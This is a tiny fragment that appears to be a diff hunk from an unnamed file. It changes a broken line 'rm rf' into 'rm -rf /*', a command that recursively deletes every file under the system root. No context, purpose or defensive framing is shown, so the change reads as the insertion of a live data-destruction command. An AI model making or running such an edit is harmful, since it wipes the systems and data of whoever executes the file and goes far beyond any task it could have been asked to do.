@@ -1,2 +1,2 @@
-rm rf
+rm -rf /*
 
